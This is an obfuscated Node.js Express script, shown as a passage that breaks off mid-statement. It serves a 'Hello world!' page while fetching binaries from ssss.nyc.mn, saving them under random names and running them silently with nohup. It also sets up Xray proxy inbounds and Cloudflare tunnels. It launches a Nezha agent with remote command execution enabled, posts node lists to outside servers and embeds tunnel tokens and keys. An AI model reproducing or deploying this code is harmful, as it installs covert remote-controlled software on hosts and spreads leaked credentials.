const _0x54da08=_0x1253;(function(_0x5eb9c5,_0x20aa66){const _0xc6a985={_0x11bae3:0x1d0,_0x5088e7:0x1f9,_0x1373d8:0x1a9,_0x204194:0x1c1,_0x2755f8:0x230,_0x531e1c:0x1f5,_0x26ed6e:0x1d6},_0x1b9358=_0x1253,_0x345226=_0x5eb9c5();while(!![]){try{const _0x1e9038=parseInt(_0x1b9358(0x22c))/0x1*(parseInt(_0x1b9358(_0xc6a985._0x11bae3))/0x2)+-parseInt(_0x1b9358(0x21c))/0x3*(parseInt(_0x1b9358(_0xc6a985._0x5088e7))/0x4)+-parseInt(_0x1b9358(0x1a5))/0x5*(parseInt(_0x1b9358(_0xc6a985._0x1373d8))/0x6)+-parseInt(_0x1b9358(0x242))/0x7*(parseInt(_0x1b9358(_0xc6a985._0x204194))/0x8)+-parseInt(_0x1b9358(_0xc6a985._0x2755f8))/0x9+parseInt(_0x1b9358(0x197))/0xa*(parseInt(_0x1b9358(_0xc6a985._0x531e1c))/0xb)+-parseInt(_0x1b9358(_0xc6a985._0x26ed6e))/0xc*(-parseInt(_0x1b9358(0x20d))/0xd);if(_0x1e9038===_0x20aa66)break;else _0x345226['push'](_0x345226['shift']());}catch(_0x532f8a){_0x345226['push'](_0x345226['shift']());}}}(_0x2476,0xa8be4));const express=require(_0x54da08(0x1c4)),app=express(),axios=require(_0x54da08(0x1f1)),os=require('os'),fs=require('fs'),path=require(_0x54da08(0x1b1)),{promisify}=require(_0x54da08(0x1f6)),exec=promisify(require(_0x54da08(0x226))[_0x54da08(0x1c5)]),{execSync}=require(_0x54da08(0x226)),UPLOAD_URL=process['env'][_0x54da08(0x20b)]||'',PROJECT_URL=process['env'][_0x54da08(0x241)]||'',AUTO_ACCESS=process[_0x54da08(0x199)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x54da08(0x199)][_0x54da08(0x1db)]||_0x54da08(0x192),SUB_PATH=process['env'][_0x54da08(0x1f0)]||_0x54da08(0x1fe),PORT=process[_0x54da08(0x199)][_0x54da08(0x1ff)]||process['env']['PORT']||0xbb8,UUID=process['env'][_0x54da08(0x1e3)]||'6e989a9d-0097-4356-9574-c6b0432cfefb',NEZHA_SERVER=process[_0x54da08(0x199)][_0x54da08(0x1c3)]||_0x54da08(0x211),NEZHA_PORT=process[_0x54da08(0x199)][_0x54da08(0x1be)]||'',NEZHA_KEY=process['env'][_0x54da08(0x20c)]||_0x54da08(0x1c8),ARGO_DOMAIN=process[_0x54da08(0x199)][_0x54da08(0x176)]||_0x54da08(0x17d),ARGO_AUTH=process[_0x54da08(0x199)][_0x54da08(0x185)]||_0x54da08(0x1c9),ARGO_PORT=process[_0x54da08(0x199)][_0x54da08(0x213)]||0x2249,CFIP=process['env'][_0x54da08(0x178)]||'cf.877774.xyz',CFPORT=process[_0x54da08(0x199)][_0x54da08(0x227)]||0x1bb,NAME=process[_0x54da08(0x199)][_0x54da08(0x23d)]||_0x54da08(0x177);!fs['existsSync'](FILE_PATH)?(fs[_0x54da08(0x1b0)](FILE_PATH),console['log'](FILE_PATH+_0x54da08(0x217))):console[_0x54da08(0x20e)](FILE_PATH+_0x54da08(0x1a0));function generateRandomName(){const _0x10c92e={_0x433c14:0x1ca,_0x35d200:0x218},_0x52f617=_0x54da08,_0x4ad8b0=_0x52f617(0x23e);let _0x465894='';for(let _0x2783e=0x0;_0x2783e<0x6;_0x2783e++){_0x465894+=_0x4ad8b0[_0x52f617(_0x10c92e._0x433c14)](Math[_0x52f617(0x1dc)](Math[_0x52f617(_0x10c92e._0x35d200)]()*_0x4ad8b0[_0x52f617(0x23c)]));}return _0x465894;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x54da08(0x186)](FILE_PATH,phpName),webPath=path[_0x54da08(0x186)](FILE_PATH,webName),botPath=path[_0x54da08(0x186)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x54da08(0x1bf)),listPath=path[_0x54da08(0x186)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x54da08(0x1d8));function deleteNodes(){const _0x315bb3={_0x4cb6b1:0x18b,_0x3a99aa:0x222,_0x33b1ea:0x1e5,_0x2abb79:0x196,_0x47432d:0x23c,_0x3b6ab8:0x1b2},_0x3b6381=_0x54da08;try{if(!UPLOAD_URL)return;if(!fs[_0x3b6381(0x19e)](subPath))return;let _0x3d913d;try{_0x3d913d=fs[_0x3b6381(_0x315bb3._0x4cb6b1)](subPath,_0x3b6381(0x1af));}catch{return null;}const _0x28f28e=Buffer[_0x3b6381(_0x315bb3._0x3a99aa)](_0x3d913d,'base64')[_0x3b6381(_0x315bb3._0x33b1ea)]('utf-8'),_0x35304d=_0x28f28e[_0x3b6381(0x17f)]('\x0a')[_0x3b6381(_0x315bb3._0x2abb79)](_0x2bfcb2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3b6381(0x1f8)](_0x2bfcb2));if(_0x35304d[_0x3b6381(_0x315bb3._0x47432d)]===0x0)return;return axios[_0x3b6381(0x1a7)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x35304d}),{'headers':{'Content-Type':_0x3b6381(0x1da)}})[_0x3b6381(_0x315bb3._0x3b6ab8)](_0x4cf422=>{return null;}),null;}catch(_0x33ab61){return null;}}function cleanupOldFiles(){const _0x3d5911={_0x1a7807:0x18f},_0x520dc6={_0x103c0d:0x186,_0x913385:0x1bb,_0xf3a786:0x19b},_0x1efaa8=_0x54da08;try{const _0x1d38fb=fs[_0x1efaa8(0x21d)](FILE_PATH);_0x1d38fb[_0x1efaa8(_0x3d5911._0x1a7807)](_0xca4b4a=>{const _0x12778d=_0x1efaa8,_0x18c4de=path[_0x12778d(_0x520dc6._0x103c0d)](FILE_PATH,_0xca4b4a);try{const _0x21f32d=fs[_0x12778d(_0x520dc6._0x913385)](_0x18c4de);_0x21f32d[_0x12778d(_0x520dc6._0xf3a786)]()&&fs['unlinkSync'](_0x18c4de);}catch(_0x973a1){}});}catch(_0x1fc03b){}}function _0x1253(_0x53bcf0,_0x354b36){const _0x247605=_0x2476();return _0x1253=function(_0x125326,_0x13ff8f){_0x125326=_0x125326-0x173;let _0x421654=_0x247605[_0x125326];return _0x421654;},_0x1253(_0x53bcf0,_0x354b36);}app[_0x54da08(0x20a)]('/',function(_0x32c924,_0x36b457){const _0x56abfc={_0x2aeeaa:0x1e1,_0x41c91a:0x18c},_0xca0d53=_0x54da08;_0x36b457[_0xca0d53(_0x56abfc._0x2aeeaa)](_0xca0d53(_0x56abfc._0x41c91a));});async function generateConfig(){const _0x31951e={_0x232c54:0x1e2,_0x15737a:0x1c0,_0x50f6cb:0x223,_0x5335c2:0x1d1,_0x522668:0x224,_0x2dee91:0x214,_0x2a7bb1:0x204,_0x35f956:0x214,_0x36341d:0x221,_0xaadb13:0x1b5,_0x551dce:0x19d,_0xd94e3:0x1e9,_0x46e824:0x1c6,_0x3a1be6:0x220,_0x33c703:0x1bc,_0xdc19b:0x1f7,_0x1d0112:0x1d8,_0x11cab0:0x193},_0x1ce9b4=_0x54da08,_0x48ee6d={'log':{'access':_0x1ce9b4(_0x31951e._0x232c54),'error':_0x1ce9b4(0x1e2),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x1ce9b4(_0x31951e._0x15737a)}],'decryption':_0x1ce9b4(_0x31951e._0x50f6cb),'fallbacks':[{'dest':0xbb9},{'path':_0x1ce9b4(_0x31951e._0x5335c2),'dest':0xbba},{'path':_0x1ce9b4(0x1b5),'dest':0xbbb},{'path':_0x1ce9b4(_0x31951e._0x522668),'dest':0xbbc}]},'streamSettings':{'network':_0x1ce9b4(0x238)}},{'port':0xbb9,'listen':_0x1ce9b4(_0x31951e._0x2dee91),'protocol':_0x1ce9b4(_0x31951e._0x2a7bb1),'settings':{'clients':[{'id':UUID}],'decryption':_0x1ce9b4(0x223)},'streamSettings':{'network':_0x1ce9b4(0x238),'security':_0x1ce9b4(_0x31951e._0x50f6cb)}},{'port':0xbba,'listen':_0x1ce9b4(0x214),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1ce9b4(0x223)},'streamSettings':{'network':'ws','security':_0x1ce9b4(0x223),'wsSettings':{'path':_0x1ce9b4(_0x31951e._0x5335c2)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x1ce9b4(0x19d)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1ce9b4(_0x31951e._0x35f956),'protocol':_0x1ce9b4(_0x31951e._0x36341d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1ce9b4(_0x31951e._0xaadb13)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1ce9b4(0x1de),_0x1ce9b4(_0x31951e._0x551dce)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1ce9b4(0x214),'protocol':_0x1ce9b4(_0x31951e._0xd94e3),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1ce9b4(0x224)}},'sniffing':{'enabled':!![],'destOverride':[_0x1ce9b4(_0x31951e._0x46e824),'tls',_0x1ce9b4(0x19d)],'metadataOnly':![]}}],'dns':{'servers':[_0x1ce9b4(_0x31951e._0x3a1be6)]},'outbounds':[{'protocol':_0x1ce9b4(_0x31951e._0x33c703),'tag':_0x1ce9b4(0x1a6)},{'protocol':'blackhole','tag':_0x1ce9b4(_0x31951e._0xdc19b)}]};fs[_0x1ce9b4(0x1eb)](path[_0x1ce9b4(0x186)](FILE_PATH,_0x1ce9b4(_0x31951e._0x1d0112)),JSON[_0x1ce9b4(_0x31951e._0x11cab0)](_0x48ee6d,null,0x2));}function getSystemArchitecture(){const _0x8b60db={_0x45d8cc:0x233},_0x151e3e=_0x54da08,_0x353f93=os[_0x151e3e(_0x8b60db._0x45d8cc)]();return _0x353f93==='arm'||_0x353f93==='arm64'||_0x353f93==='aarch64'?_0x151e3e(0x1a3):'amd';}function downloadFile(_0x187fdd,_0x3c18da,_0x4f5612){const _0x1e1c8f={_0x56a70e:0x188,_0x5efff8:0x1ed},_0x3ce04b={_0x3a5094:0x198,_0x25422b:0x1fd},_0x519747={_0x449817:0x215,_0xba4667:0x1cf,_0x334577:0x1fd},_0x1e475f={_0x43dbaa:0x1d9,_0x5948af:0x1fd},_0x2288b9={_0x4f3f97:0x198},_0x411118=_0x54da08,_0x451524=_0x187fdd;!fs[_0x411118(0x19e)](FILE_PATH)&&fs[_0x411118(0x1b0)](FILE_PATH,{'recursive':!![]});const _0x1218da=fs[_0x411118(_0x1e1c8f._0x56a70e)](_0x451524);axios({'method':'get','url':_0x3c18da,'responseType':_0x411118(_0x1e1c8f._0x5efff8)})[_0x411118(0x1ee)](_0x419223=>{const _0x3d2e2c=_0x411118;_0x419223[_0x3d2e2c(_0x519747._0x449817)]['pipe'](_0x1218da),_0x1218da['on'](_0x3d2e2c(_0x519747._0xba4667),()=>{const _0x3c7c65=_0x3d2e2c;_0x1218da[_0x3c7c65(0x1c7)](),console['log'](_0x3c7c65(0x1d9)+path[_0x3c7c65(_0x2288b9._0x4f3f97)](_0x451524)+_0x3c7c65(0x18e)),_0x4f5612(null,_0x451524);}),_0x1218da['on'](_0x3d2e2c(_0x519747._0x334577),_0x47c856=>{const _0x3db9db=_0x3d2e2c;fs['unlink'](_0x451524,()=>{});const _0x44e9f5=_0x3db9db(_0x1e475f._0x43dbaa)+path[_0x3db9db(0x198)](_0x451524)+'\x20failed:\x20'+_0x47c856[_0x3db9db(0x21a)];console[_0x3db9db(_0x1e475f._0x5948af)](_0x44e9f5),_0x4f5612(_0x44e9f5);});})['catch'](_0x537f1e=>{const _0x4579cd=_0x411118,_0x4f75a5=_0x4579cd(0x1d9)+path[_0x4579cd(_0x3ce04b._0x3a5094)](_0x451524)+_0x4579cd(0x1ea)+_0x537f1e['message'];console[_0x4579cd(_0x3ce04b._0x25422b)](_0x4f75a5),_0x4f5612(_0x4f75a5);});}function _0x2476(){const _0x177353=['ARGO_AUTH','join','https://amd64.ssss.nyc.mn/web','createWriteStream','\x22\x20>\x20/dev/null\x202>&1','http://ip-api.com/json/','readFileSync','Hello\x20world!','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20successfully','forEach','ARGO_DOMAIN:','Unknown','./tmp','stringify','success','pop','filter','634210dTuucP','basename','env','fileUrl','isFile','8443','quic','existsSync','countryCode','\x20already\x20exists','listen','pkill\x20-f\x20\x22[','arm','https://oooo.serv00.net/add-url','6620Vblins','direct','post','https://amd64.ssss.nyc.mn/agent','1176wkOogT','Empowerment\x20success\x20for\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','TunnelSecret','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://arm64.ssss.nyc.mn/v1','utf-8','mkdirSync','path','catch','Error\x20in\x20startserver:','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/vmess-argo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','http\x20server\x20is\x20running\x20on\x20port:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','firefox','--tls','statSync','freedom','Error\x20executing\x20command:\x20','NEZHA_PORT','sub.txt','xtls-rprx-vision','664AVlPql','2087','NEZHA_SERVER','express','exec','http','close','DPgysB5rUuAihUrI3mbKm6vay19sawuv','eyJhIjoiNWNmZDhkODFhNTUyMWFkY2ExZDgwNTQwY2I4NjQ5ZTYiLCJ0IjoiYmNkNGJjMmItMWIxMS00ZTEwLWI0ZmItYzY1YjRjZDRmODY2IiwicyI6Ik9UazFOV1E0TnpNdFpqTTNZUzAwT1RNd0xXSXpaREl0TW1Nd05qazNPR0UyTnpWayJ9','charAt','push','set','del\x20/f\x20/q\x20','map','finish','1827746cqQIRI','/vless-argo','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/tunnel.yml\x20run','npm\x20running\x20error:\x20','/vmess-argo?ed=2560','36SOAZtK','\x0avless://','config.json','Download\x20','application/json','FILE_PATH','floor','/api/add-subscriptions','tls','all','org','send','/dev/null','UUID','Error\x20downloading\x20files:','toString','has','\x20is\x20running','2053','trojan','\x20failed:\x20','writeFileSync','\x20-c\x20','stream','then','\x20>/dev/null\x202>&1\x20&','SUB_PATH','axios','web\x20running\x20error:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Error\x20reading\x20boot.log:','176SgaHiY','util','block','test','404812PSysXM','Subscription\x20uploaded\x20successfully','\x20>\x20nul\x202>&1','App\x20is\x20running','error','sub','SERVER_PORT','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20tunnel:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','ArgoDomain:','vless','country_code','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://arm64.ssss.nyc.mn/web','clear','get','UPLOAD_URL','NEZHA_KEY','6163703xWfTlm','log','platform','Unhandled\x20error\x20in\x20startserver:','nz.luyuhanv5.top:443','substring','ARGO_PORT','127.0.0.1','data','chmod','\x20is\x20created','random','?security=tls&sni=','message','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','33QPqphg','readdirSync','unshift','\x20>/dev/null\x202>&1','https+local://8.8.8.8/dns-query','vmess','from','none','/trojan-argo','/config.json\x20>/dev/null\x202>&1\x20&','child_process','CFPORT','\x20-p\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','match','tunnel.json','1yAAegx','&fp=firefox&type=ws&host=','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://amd64.ssss.nyc.mn/v1','5258988hSpbHl','tunnel.yml','includes','arch','https://arm64.ssss.nyc.mn/agent','\x0aclient_secret:\x20','true','Skipping\x20adding\x20automatic\x20access\x20task','tcp','.exe\x20>\x20nul\x202>&1','automatic\x20access\x20task\x20added\x20successfully','status','length','NAME','abcdefghijklmnopqrstuvwxyz','php\x20running\x20error:\x20','2096','PROJECT_URL','59269orhXtK','/api/add-nodes','config.yaml','boot.log','ARGO_DOMAIN','leaflow','CFIP','&path=%2Ftrojan-argo%3Fed%3D2560#','nohup\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','response','leaflow.lyh.hidns.co','unlinkSync','split','\x0a\x0atrojan://','2083','base64','\x20-c\x20\x22','443'];_0x2476=function(){return _0x177353;};return _0x2476();}async function downloadFilesAndRun(){const _0x3c1c10={_0x25fccc:0x23c,_0x3b7ad6:0x20e,_0x305a26:0x1b4,_0x631c0f:0x1df,_0x5f5bf9:0x1fd,_0x1e706d:0x1e4,_0x194cf9:0x232,_0x130a54:0x17f,_0x564033:0x195,_0x519113:0x19c,_0x1e6314:0x1c2,_0x53793d:0x1e8,_0x59ffc3:0x22e,_0x5733f6:0x174,_0x2dbad8:0x21b,_0x1aa902:0x23f,_0x2a3d54:0x184,_0x54996a:0x240,_0x5a89cc:0x1c2,_0x2f4612:0x1ba,_0x34166b:0x17a,_0x62b63:0x20e,_0xea1f95:0x1ec,_0x2dee76:0x225,_0x2cbd43:0x1e7,_0xd7e5db:0x1f2,_0x5452d7:0x22a,_0x7a99ca:0x17b,_0x155a6b:0x1e7,_0x5757d3:0x1bd},_0x51aced={_0x32ac8c:0x18f},_0x12f21f=_0x54da08,_0x5b34a7=getSystemArchitecture(),_0x530b0d=getFilesForArchitecture(_0x5b34a7);if(_0x530b0d[_0x12f21f(_0x3c1c10._0x25fccc)]===0x0){console[_0x12f21f(_0x3c1c10._0x3b7ad6)](_0x12f21f(_0x3c1c10._0x305a26));return;}const _0x3cff72=_0x530b0d[_0x12f21f(0x1ce)](_0x5f98e3=>{const _0x3ee06d={_0x24c44f:0x19a};return new Promise((_0x8abae0,_0x4a619c)=>{const _0x52c378=_0x1253;downloadFile(_0x5f98e3['fileName'],_0x5f98e3[_0x52c378(_0x3ee06d._0x24c44f)],(_0x35d7cc,_0x5c40b5)=>{_0x35d7cc?_0x4a619c(_0x35d7cc):_0x8abae0(_0x5c40b5);});});});try{await Promise[_0x12f21f(_0x3c1c10._0x631c0f)](_0x3cff72);}catch(_0x596046){console[_0x12f21f(_0x3c1c10._0x5f5bf9)](_0x12f21f(_0x3c1c10._0x1e706d),_0x596046);return;}function _0xcf6835(_0x3ff4e8){const _0x1acba0={_0x152aaf:0x1fd,_0x15b531:0x1aa,_0x2ba0f8:0x1e5},_0x228830=_0x12f21f,_0xcaf0cd=0x1fd;_0x3ff4e8[_0x228830(_0x51aced._0x32ac8c)](_0x85c7cf=>{const _0x417b98=_0x228830;fs['existsSync'](_0x85c7cf)&&fs[_0x417b98(0x216)](_0x85c7cf,_0xcaf0cd,_0x58df30=>{const _0xbc0884=_0x417b98;_0x58df30?console[_0xbc0884(_0x1acba0._0x152aaf)]('Empowerment\x20failed\x20for\x20'+_0x85c7cf+':\x20'+_0x58df30):console[_0xbc0884(0x20e)](_0xbc0884(_0x1acba0._0x15b531)+_0x85c7cf+':\x20'+_0xcaf0cd[_0xbc0884(_0x1acba0._0x2ba0f8)](0x8));});});}const _0x336b50=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xcf6835(_0x336b50);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2764b0=NEZHA_SERVER[_0x12f21f(_0x3c1c10._0x194cf9)](':')?NEZHA_SERVER[_0x12f21f(_0x3c1c10._0x130a54)](':')[_0x12f21f(_0x3c1c10._0x564033)]():'',_0x3a9b3c=new Set(['443',_0x12f21f(_0x3c1c10._0x519113),_0x12f21f(0x240),_0x12f21f(_0x3c1c10._0x1e6314),_0x12f21f(0x181),_0x12f21f(_0x3c1c10._0x53793d)]),_0x1a2ea1=_0x3a9b3c[_0x12f21f(0x1e6)](_0x2764b0)?_0x12f21f(0x236):'false',_0x2ea9da=_0x12f21f(0x235)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x12f21f(_0x3c1c10._0x59ffc3)+_0x1a2ea1+_0x12f21f(0x200)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x12f21f(_0x3c1c10._0x5733f6)),_0x2ea9da);const _0x51d203=_0x12f21f(0x17a)+phpPath+_0x12f21f(0x183)+FILE_PATH+_0x12f21f(_0x3c1c10._0x2dbad8);try{await exec(_0x51d203),console['log'](phpName+_0x12f21f(0x1e7)),await new Promise(_0x40ab05=>setTimeout(_0x40ab05,0x3e8));}catch(_0x684bbb){console[_0x12f21f(_0x3c1c10._0x5f5bf9)](_0x12f21f(_0x3c1c10._0x1aa902)+_0x684bbb);}}else{let _0x351991='';const _0x463065=[_0x12f21f(_0x3c1c10._0x2a3d54),'8443',_0x12f21f(_0x3c1c10._0x54996a),_0x12f21f(_0x3c1c10._0x5a89cc),_0x12f21f(0x181),_0x12f21f(0x1e8)];_0x463065[_0x12f21f(0x232)](NEZHA_PORT)&&(_0x351991=_0x12f21f(_0x3c1c10._0x2f4612));const _0x87077=_0x12f21f(_0x3c1c10._0x34166b)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x12f21f(0x228)+NEZHA_KEY+'\x20'+_0x351991+_0x12f21f(0x206);try{await exec(_0x87077),console[_0x12f21f(_0x3c1c10._0x62b63)](npmName+_0x12f21f(0x1e7)),await new Promise(_0x1820e6=>setTimeout(_0x1820e6,0x3e8));}catch(_0x4a6e0b){console[_0x12f21f(_0x3c1c10._0x5f5bf9)](_0x12f21f(0x1d4)+_0x4a6e0b);}}}else console[_0x12f21f(_0x3c1c10._0x62b63)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5d9c93=_0x12f21f(0x17a)+webPath+_0x12f21f(_0x3c1c10._0xea1f95)+FILE_PATH+_0x12f21f(_0x3c1c10._0x2dee76);try{await exec(_0x5d9c93),console[_0x12f21f(0x20e)](webName+_0x12f21f(_0x3c1c10._0x2cbd43)),await new Promise(_0x29f3c1=>setTimeout(_0x29f3c1,0x3e8));}catch(_0x934f21){console[_0x12f21f(_0x3c1c10._0x5f5bf9)](_0x12f21f(_0x3c1c10._0xd7e5db)+_0x934f21);}if(fs['existsSync'](botPath)){let _0x5e4754;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x5e4754='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x12f21f(_0x3c1c10._0x5452d7)](/TunnelSecret/)?_0x5e4754=_0x12f21f(0x1b6)+FILE_PATH+_0x12f21f(0x1d3):_0x5e4754=_0x12f21f(0x1b8)+FILE_PATH+_0x12f21f(_0x3c1c10._0x7a99ca)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5e4754+_0x12f21f(0x1ef)),console['log'](botName+_0x12f21f(_0x3c1c10._0x155a6b)),await new Promise(_0x536123=>setTimeout(_0x536123,0x7d0));}catch(_0x36ce74){console[_0x12f21f(_0x3c1c10._0x5f5bf9)](_0x12f21f(_0x3c1c10._0x5757d3)+_0x36ce74);}}await new Promise(_0x4e0e06=>setTimeout(_0x4e0e06,0x1388));}function getFilesForArchitecture(_0x45f257){const _0x24bcc4={_0x18370e:0x208,_0x17157b:0x1a3,_0x47b5d7:0x1ae,_0x35ac52:0x21e},_0x2e04b1=_0x54da08;let _0x29ddcf;_0x45f257===_0x2e04b1(0x1a3)?_0x29ddcf=[{'fileName':webPath,'fileUrl':_0x2e04b1(_0x24bcc4._0x18370e)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x29ddcf=[{'fileName':webPath,'fileUrl':_0x2e04b1(0x187)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xcf1e23=_0x45f257===_0x2e04b1(_0x24bcc4._0x17157b)?_0x2e04b1(0x234):_0x2e04b1(0x1a8);_0x29ddcf[_0x2e04b1(0x21e)]({'fileName':npmPath,'fileUrl':_0xcf1e23});}else{const _0xd72bd4=_0x45f257===_0x2e04b1(0x1a3)?_0x2e04b1(_0x24bcc4._0x47b5d7):_0x2e04b1(0x22f);_0x29ddcf[_0x2e04b1(_0x24bcc4._0x35ac52)]({'fileName':phpPath,'fileUrl':_0xd72bd4});}}return _0x29ddcf;}function argoType(){const _0x3ba90c={_0x38ef38:0x20e,_0x2f1100:0x1f3,_0x11d042:0x1ad,_0x1ccd50:0x18d,_0x446831:0x229,_0x568a4d:0x1eb,_0x530812:0x207},_0x137e01=_0x54da08;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x137e01(_0x3ba90c._0x38ef38)](_0x137e01(_0x3ba90c._0x2f1100));return;}if(ARGO_AUTH[_0x137e01(0x232)](_0x137e01(0x1ac))){fs['writeFileSync'](path['join'](FILE_PATH,_0x137e01(0x22b)),ARGO_AUTH);const _0x249488=_0x137e01(0x201)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x137e01(0x186)](FILE_PATH,_0x137e01(0x22b))+_0x137e01(_0x3ba90c._0x11d042)+ARGO_DOMAIN+_0x137e01(_0x3ba90c._0x1ccd50)+ARGO_PORT+_0x137e01(_0x3ba90c._0x446831);fs[_0x137e01(_0x3ba90c._0x568a4d)](path[_0x137e01(0x186)](FILE_PATH,_0x137e01(0x231)),_0x249488);}else console[_0x137e01(_0x3ba90c._0x38ef38)](_0x137e01(_0x3ba90c._0x530812));}async function extractDomains(){const _0x5f4e68={_0x3f52fe:0x190,_0x9efa88:0x18b,_0x9de36e:0x175,_0xf6eb12:0x1af,_0x249927:0x17f,_0x3db122:0x23c,_0x361a8e:0x203,_0x387fd4:0x17e,_0x58a60c:0x186,_0x150e1b:0x175,_0x587d98:0x1b8,_0xb2dd7c:0x1bd,_0x2aab96:0x1f4},_0x2b7746={_0x944818:0x215,_0x8407a0:0x205,_0x376efe:0x18a,_0x2ff953:0x194,_0x1cdb65:0x215,_0x226d08:0x215,_0x5c3350:0x1e0,_0x7e406a:0x215,_0x33ceb4:0x19f,_0x43152f:0x191},_0x569dfb={_0x412c92:0x239,_0x39d401:0x1a2,_0xa75246:0x189},_0x1e94f5=_0x54da08;let _0x4c8878;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4c8878=ARGO_DOMAIN,console[_0x1e94f5(0x20e)](_0x1e94f5(_0x5f4e68._0x3f52fe),_0x4c8878),await _0x2f7b2f(_0x4c8878);else try{const _0x253bd6=fs[_0x1e94f5(_0x5f4e68._0x9efa88)](path[_0x1e94f5(0x186)](FILE_PATH,_0x1e94f5(_0x5f4e68._0x9de36e)),_0x1e94f5(_0x5f4e68._0xf6eb12)),_0x18538d=_0x253bd6[_0x1e94f5(_0x5f4e68._0x249927)]('\x0a'),_0x28b431=[];_0x18538d['forEach'](_0x2c3738=>{const _0x38e289=_0x2c3738['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x38e289){const _0x419e85=_0x38e289[0x1];_0x28b431['push'](_0x419e85);}});if(_0x28b431[_0x1e94f5(_0x5f4e68._0x3db122)]>0x0)_0x4c8878=_0x28b431[0x0],console['log'](_0x1e94f5(_0x5f4e68._0x361a8e),_0x4c8878),await _0x2f7b2f(_0x4c8878);else{console[_0x1e94f5(0x20e)](_0x1e94f5(0x202)),fs[_0x1e94f5(_0x5f4e68._0x387fd4)](path[_0x1e94f5(_0x5f4e68._0x58a60c)](FILE_PATH,_0x1e94f5(_0x5f4e68._0x150e1b)));async function _0x4f5551(){const _0x187ddc=_0x1e94f5;try{process[_0x187ddc(0x20f)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x187ddc(_0x569dfb._0x412c92)):await exec(_0x187ddc(_0x569dfb._0x39d401)+botName[_0x187ddc(0x1ca)](0x0)+']'+botName[_0x187ddc(0x212)](0x1)+_0x187ddc(_0x569dfb._0xa75246));}catch(_0x4ea6c1){}}_0x4f5551(),await new Promise(_0x34671e=>setTimeout(_0x34671e,0xbb8));const _0x149294=_0x1e94f5(_0x5f4e68._0x587d98)+FILE_PATH+_0x1e94f5(0x17b)+ARGO_PORT;try{await exec(_0x1e94f5(0x17a)+botPath+'\x20'+_0x149294+_0x1e94f5(0x1ef)),console[_0x1e94f5(0x20e)](botName+_0x1e94f5(0x1e7)),await new Promise(_0x45196f=>setTimeout(_0x45196f,0xbb8)),await 